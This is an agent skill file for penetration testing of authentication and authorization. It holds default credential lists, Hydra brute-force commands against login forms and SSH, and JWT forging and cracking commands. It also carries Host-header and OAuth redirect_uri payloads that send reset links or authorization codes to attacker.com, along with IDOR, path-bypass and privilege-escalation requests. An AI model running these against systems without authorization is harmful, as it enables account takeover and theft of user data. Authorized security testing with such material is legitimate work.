---
name: auth-bypass
description: Test for authentication and authorization flaws including credential attacks, session issues, and access control bypasses
origin: RedteamOpencode
---

# Authentication & Authorization Bypass

## When to Activate

- Login forms, registration, or password reset functionality
- Protected resources or admin panels
- APIs with authentication (tokens, API keys, sessions)
- Role-based access control in the application
- JWT or OAuth-based authentication

## Authentication Testing

### 1. Default and Weak Credentials

```
# Common default credentials to try
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest
administrator:administrator

# Check for vendor defaults
# Search: "product_name default credentials"

# Username enumeration — watch for response differences
# Different error for valid vs invalid username
# Timing differences on login attempts
# Account lockout only on valid accounts
```

### 2. Brute Force with Hydra

```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin

# With username list
hydra -L users.txt -P passwords.txt target http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Login failed"

# Rate-limited? Slow down
hydra -l admin -P passwords.txt -t 1 -W 5 target http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# SSH brute force
hydra -l root -P passwords.txt target ssh -t 4
```

### 3. Password Reset Flaws

```
# Test for:
- Predictable reset tokens (sequential, timestamp-based, short tokens)
- Token not tied to specific account (use token from account A on account B)
- Token reuse (token still valid after password change)
- No token expiration
- Host header injection in reset emails
  Host: attacker.com  (reset link may use attacker domain)
- Password reset via parameter: email=victim@mail.com&email=attacker@mail.com
```

### 4. Session Management

```
# Session fixation
1. Get a session token
2. Force it onto victim (via URL, cookie injection)
3. After victim authenticates, use the same token

# Session token analysis
- Collect 20+ tokens, check for patterns
- Low entropy or predictable values
- Sequential tokens
- Tokens that don't change after login/logout
- Tokens not invalidated on logout
- Tokens not invalidated on password change

# Cookie flags — check with browser dev tools
- Missing HttpOnly (accessible to JavaScript)
- Missing Secure (sent over HTTP)
- Missing SameSite (CSRF risk)
- Overly broad Domain/Path scope
```

### 5. Multi-Factor Authentication Bypass

```
# Test for:
- MFA bypass via direct navigation to post-auth pages
- MFA code brute force (4-6 digit codes with no rate limiting)
- MFA code reuse
- Response manipulation (change "success":false to "success":true)
- Backup codes — predictable or enumerable
- MFA not enforced on all auth paths (API vs web, mobile vs desktop)
- MFA disable without re-authentication
```

## Authorization Testing

### 1. IDOR (Insecure Direct Object Reference)

```
# Horizontal privilege escalation — access other users' data
GET /api/user/1001/profile  ->  GET /api/user/1002/profile
GET /invoice?id=5001        ->  GET /invoice?id=5002
GET /download?file=report_1001.pdf -> GET /download?file=report_1002.pdf

# Test with:
- Sequential IDs (increment/decrement)
- UUIDs (if leaked elsewhere in the app)
- Encoded values (Base64 decode, modify, re-encode)
- Parameter pollution: ?id=1001&id=1002
- Different HTTP methods: GET blocked but PUT/DELETE works

# Vertical privilege escalation — access higher-privilege functions
# Log in as regular user, try admin endpoints
GET /admin/users
POST /api/admin/create-user
DELETE /api/user/1002
PUT /api/user/1002/role  {"role": "admin"}
```

### 2. Forced Browsing

```bash
# Access protected pages without authentication
/admin
/admin/dashboard
/console
/manager
/debug
/internal
/api/admin/users
/swagger-ui.html
/graphql

# Check if 302 redirect can be bypassed
- Ignore redirect, read response body (may contain protected content)
- Use curl: curl -k https://target/admin (follow vs don't follow redirects)
```

### 3. HTTP Method/Verb Tampering

```
# Endpoint blocks GET but allows other methods
GET /admin/delete-user?id=1  -> 403
POST /admin/delete-user      -> 200 (body: id=1)
PUT /admin/delete-user       -> 200

# Override methods
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-Original-Method: PATCH
```

### 4. Path Traversal for Access Control

```
# Bypass path-based access control rules
/admin -> 403
/ADMIN -> 200
/admin/ -> 200
/./admin -> 200
/admin;.js -> 200
/%2fadmin -> 200
/admin%20 -> 200
/admin..;/ -> 200 (Tomcat/Spring)
```

### 5. JWT Attacks

```bash
# Decode JWT (header.payload.signature)
echo "HEADER_B64" | base64 -d
echo "PAYLOAD_B64" | base64 -d

# Algorithm confusion — change RS256 to HS256
# Sign with the public key as HMAC secret

# None algorithm
# Change header to {"alg":"none"} and remove signature
# Token: HEADER.PAYLOAD.

# Weak secret — brute force
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Payload manipulation
# Change "role":"user" to "role":"admin"
# Change "sub":"1001" to "sub":"1002"
# Modify expiration: "exp" claim

# Key injection (jwk/jku/kid header parameters)
# kid injection: {"kid":"../../dev/null"} -> sign with empty secret
# jku: point to attacker-controlled JWK set URL

# Tools
jwt_tool TOKEN -T                  # Tamper mode
jwt_tool TOKEN -C -d wordlist.txt  # Crack secret
```

### 6. OAuth/SSO Flaws

```
# Test for:
- Open redirect in redirect_uri (steal authorization code)
  redirect_uri=https://attacker.com
  redirect_uri=https://legit.com@attacker.com
  redirect_uri=https://legit.com.attacker.com

- CSRF in OAuth flow (missing state parameter)
- Token leakage via Referer header
- Scope escalation
- Account linking without proper verification
```

### 7. Role/Privilege Manipulation

```
# Parameter-based role assignment
POST /register  {"username":"test","password":"test","role":"admin"}
POST /register  {"username":"test","password":"test","isAdmin":true}

# Mass assignment — add unexpected fields
PUT /api/profile {"name":"test","role":"admin","is_staff":true}

# Header-based trust
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

## Methodology Checklist

1. **Map all auth endpoints:** login, register, reset, logout, MFA, OAuth
2. **Create accounts at each privilege level** (user, moderator, admin if possible)
3. **Test each privileged action** with lower-privilege or no-auth sessions
4. **Swap session tokens** between privilege levels and test each endpoint
5. **Test every object reference** with IDs from other accounts
6. **Check JWT/token security** if token-based auth is used
7. **Test session lifecycle:** fixation, expiration, invalidation on logout

## What to Record

- **Bypass method:** exact technique that worked (IDOR, JWT manipulation, forced browsing)
- **Affected resource:** specific endpoint or functionality compromised
- **Privilege level:** what access was gained (horizontal vs vertical escalation)
- **Impact:** data accessed, actions performed, accounts affected
- **Reproducible steps:** exact requests with tokens/parameters
- **Authentication weaknesses:** enumeration, weak lockout, token issues
